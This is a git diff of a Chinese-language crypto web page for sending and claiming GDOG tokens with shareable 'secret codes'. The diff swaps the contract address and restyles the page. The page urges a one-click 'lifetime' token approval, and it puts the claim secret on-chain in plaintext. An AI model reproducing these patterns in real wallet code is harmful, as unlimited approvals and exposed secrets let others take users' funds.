@@ -2,48 +2,49 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<title>GDOG 隐私转账</title>
-<link rel="icon" type="image/png" href="https://woofinglabs.github.io/GdogToTheMoon/images/gdog_logo.png">
+<title>GDOG 隐形转账</title>
+<link rel="icon" href="https://woofinglabs.github.io/GdogToTheMoon/images/gdog_logo.png">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#000;color:#fff;font-family:system-ui;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:1rem}
-.c{max-width:380px;width:100%;background:#111;border:2px solid #00ff88;border-radius:25px;padding:30px;box-shadow:0 0 40px #00ff8850}
-.logo{width:80px;height:80px;border-radius:50%;margin:0 auto 15px;display:block}
-h1{font-size:26px;text-align:center;background:linear-gradient(90deg,#00ff88,#88ff00);-webkit-background-clip:text;color:transparent}
-button,textarea{width:100%;padding:14px;margin:10px 0;border-radius:14px;font-size:16px}
-button{background:#00ff88;color:#000;font-weight:900;border:none;cursor:pointer;height:55px;transition:.3s}
-button:hover{transform:scale(1.05)}
+body{background:#000;color:#fff;font-family:system-ui;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:1rem;background:radial-gradient(circle at center,#111 0%,#000 100%)}
+.c{max-width:380px;width:100%;background:#111;border:2px solid #00ff88;border-radius:25px;padding:30px;box-shadow:0 0 50px #00ff8830;overflow:hidden}
+.logo{width:80px;height:80px;border-radius:50%;margin:0 auto 15px;display:block;animation:float 3s infinite}
+h1{font-size:26px;text-align:center;background:linear-gradient(90deg,#00ff88,#88ff00);-webkit-background-clip:text;color:transparent;margin-bottom:20px}
+button,textarea{width:100%;padding:15px;margin:10px 0;border-radius:15px;font-size:16px;border:none;outline:none}
+button{background:#00ff88;color:#000;font-weight:900;cursor:pointer;height:56px;transition:.3s;box-shadow:0 4px 15px #00ff8850}
+button:hover{transform:scale(1.05);box-shadow:0 8px 25px #00ff88}
 button:disabled{opacity:0.5;cursor:not-allowed}
-textarea{background:#000;border:1px solid #333;color:#fff;outline:none}
-#log{color:#0f0;text-align:center;margin-top:10px;font-size:14px;line-height:1.6}
-.hide{display:none}
+textarea{background:#000;border:1px solid #333;color:#0f0;height:80px;resize:none}
+#log{color:#88ff00;text-align:center;margin:15px 0;font-size:15px;line-height:1.6}
+#balance{color:#00ff88;font-weight:900;margin:10px 0;text-align:center}
 #qrcode{text-align:center;margin:15px 0}
-#balance{font-size:14px;color:#88ff00;margin:8px 0;text-align:center}
+.hide{display:none}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
 </style>
 </head>
 <body>
 <div class="c">
   <img src="https://woofinglabs.github.io/GdogToTheMoon/images/gdog_logo.png" class="logo">
-  <h1>GDOG 隐私转账</h1>
+  <h1>GDOG 隐形转账</h1>
   <button id="connect">连接钱包</button>
 
   <div id="main" class="hide">
     <div id="balance">GDOG 余额：加载中...</div>
-    <button id="approve">一键授权 GDOG（终身免）</button>
+    <button id="approve">一键授权（终身免）</button>
 
-    <button id="send1">转 1 万 + 生成暗号</button>
-    <button id="send2">转 10 万 + 生成暗号</button>
-    <button id="send3">转 100 万 + 生成暗号</button>
+    <button id="send1">发 1 万 GDOG</button>
+    <button id="send2">发 10 万 GDOG</button>
+    <button id="send3">发 100 万 GDOG</button>
 
-    <div id="code" style="background:#222;padding:15px;border-radius:12px;margin:15px 0;display:none">
-      <textarea id="dark" rows="3" readonly></textarea>
+    <div id="codeBox" style="background:#222;padding:15px;border-radius:12px;margin:15px 0;display:none">
+      <textarea id="darkCode" rows="3" readonly></textarea>
       <div id="qrcode"></div>
-      <button onclick="copyDark()">复制暗号</button>
+      <button onclick="copyCode()">复制暗号</button>
     </div>
 
-    <textarea id="paste" rows="3" placeholder="粘贴暗号 → 一键领 GDOG"></textarea>
-    <button id="claim">一键领 GDOG</button>
+    <textarea id="pasteCode" rows="3" placeholder="粘贴暗号 → 一键领 GDOG"></textarea>
+    <button id="claimBtn">一键领 GDOG</button>
 
     <div id="log">状态：等待连接</div>
   </div>
@@ -54,16 +55,16 @@ textarea{background:#000;border:1px solid #333;color:#fff;outline:none}
 
 <script>
 const CHAIN_ID = 10088;
-const RPC_URL = 'https://gatelayer-mainnet.gatenode.cc/';
-const CONTRACT = '0x57691E8FBd8c9e6C7196aaf600489a68bb33E296';
+const RPC = 'https://gatelayer-mainnet.gatenode.cc/';
+const CONTRACT = '0xDBC6218A67e57c0e9E11F2aAcE2fe315a68a507A';
 const GDOG = '0xf6D9Cf57e20bA0d33372E8998A9424aa53411E04';
 
 const ABI = [
   {"inputs":[{"internalType":"uint8","name":"level","type":"uint8"},{"internalType":"bytes32","name":"code","type":"bytes32"}],"name":"send","outputs":[],"stateMutability":"nonpayable","type":"function"},
-  {"inputs":[{"internalType":"bytes32","name":"code","type":"bytes32"}],"name":"receivePriv","outputs":[],"stateMutability":"nonpayable","type":"function"}
+  {"inputs":[{"internalType":"bytes32","name":"code","type":"bytes32"}],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"}
 ];
-const ABI_ERC20 = [
-  {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+const ERC20_ABI = [
+  {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},
   {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
 ];
 
@@ -71,31 +72,31 @@ let web3, account, contract, token;
 const $ = s => document.querySelector(s);
 const log = $('#log');
 
-async function addOrSwitchChain() {
+async function switchChain() {
   const hex = '0x' + CHAIN_ID.toString(16);
   try {
     await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hex }] });
   } catch (e) {
-    if (e.code === 4902) await ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: hex, chainName: 'Gate Layer', rpcUrls: [RPC_URL], nativeCurrency: { name: 'GT', symbol: 'GT', decimals: 18 } }] });
-    else throw e;
+    if (e.code === 4902) {
+      await ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: hex, chainName: 'GateLayer', rpcUrls: [RPC], nativeCurrency: { name: 'GT', symbol: 'GT', decimals: 18 } }] });
+    }
   }
 }
 
-async function connect() {
+$('#connect').onclick = async () => {
   if (!window.ethereum) return alert('请安装 MetaMask');
-  await addOrSwitchChain();
+  await switchChain();
   await ethereum.request({ method: 'eth_requestAccounts' });
-  web3 = new Web3(window.ethereum);
+  web3 = new Web3(ethereum);
   [account] = await web3.eth.getAccounts();
   contract = new web3.eth.Contract(ABI, CONTRACT);
-  token = new web3.eth.Contract(ABI_ERC20, GDOG);
+  token = new web3.eth.Contract(ERC20_ABI, GDOG);
 
   $('#connect').innerHTML = `已连接 ${account.slice(0,6)}...${account.slice(-4)}`;
   $('#main').classList.remove('hide');
   updateBalance();
   setInterval(updateBalance, 8000);
-}
-$('#connect').onclick = connect;
+};
 
 async function updateBalance() {
   try {
@@ -114,28 +115,29 @@ $('#approve').onclick = async () => {
     log.innerHTML = '<span style="color:#88ff00">授权成功！终身免批</span>';
     btn.style.display = 'none';
   } catch (e) {
-    log.innerText = '授权失败：' + (e.message.split('\n')[0] || '');
+    log.innerText = '授权失败';
     btn.disabled = false;
   }
 };
 
 function randomCode() {
-  return '0x' + Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b=>b.toString(16).padStart(2,'0')).join('');
+  return '0x' + Array.from(crypto.getRandomValues(new Uint8Array(32)))
+    .map(b => b.toString(16).padStart(2,'0')).join('');
 }
 
 async function sendLevel(level) {
   const amt = level===1?'1万':level===2?'10万':'100万';
   const btn = event.target; btn.disabled = true;
-  log.innerText = `转 ${amt} 中...`;
+  log.innerText = `发送 ${amt} 中...`;
   const code = randomCode();
   try {
     await contract.methods.send(level, code).send({ from: account });
     const dark = btoa(code);
-    $('#dark').value = dark;
-    $('#code').style.display = 'block';
+    $('#darkCode').value = dark;
+    $('#codeBox').style.display = 'block';
     $('#qrcode').innerHTML = '';
     QRCode.toCanvas($('#qrcode'), dark, { width: 180, color: { dark: '#00ff88' } });
-    log.innerHTML = `成功！已转 ${amt}<br><span style="color:#88ff00">复制暗号发朋友</span>`;
+    log.innerHTML = `成功发出 ${amt}<br><span style="color:#88ff00">暗号已生成，扫码发送</span>`;
     updateBalance();
   } catch (e) {
     log.innerText = e.message.includes('allowance') ? '请先点“一键授权”' : '失败：余额不足';
@@ -146,14 +148,14 @@ $('#send1').onclick = () => sendLevel(1);
 $('#send2').onclick = () => sendLevel(2);
 $('#send3').onclick = () => sendLevel(3);
 
-window.copyDark = () => {
-  $('#dark').select();
-  navigator.clipboard.writeText($('#dark').value);
+window.copyCode = () => {
+  $('#darkCode').select();
+  navigator.clipboard.writeText($('#darkCode').value);
   log.innerText = '暗号已复制！';
 };
 
-$('#claim').onclick = async () => {
-  const input = $('#paste').value.trim();
+$('#claimBtn').onclick = async () => {
+  const input = $('#pasteCode').value.trim();
   if (!input) return log.innerText = '请粘贴暗号';
   let code;
   try { code = atob(input); } catch { return log.innerText = '暗号错误'; }
@@ -161,12 +163,12 @@ $('#claim').onclick = async () => {
 
   log.innerText = '领取中...';
   try {
-    await contract.methods.receivePriv(code).send({ from: account });
+    await contract.methods.claim(code).send({ from: account });
     log.innerHTML = '<span style="color:#88ff00">成功！GDOG 已到账</span>';
-    $('#paste').value = '';
+    $('#pasteCode').value = '';
     setTimeout(updateBalance, 2000);
   } catch (e) {
-    log.innerText = e.message.includes('used') ? '已领过' : '空投已空';
+    log.innerText = e.message.includes('invalid') ? '暗号无效或已领' : '领取失败';
   }
 };
 </script>
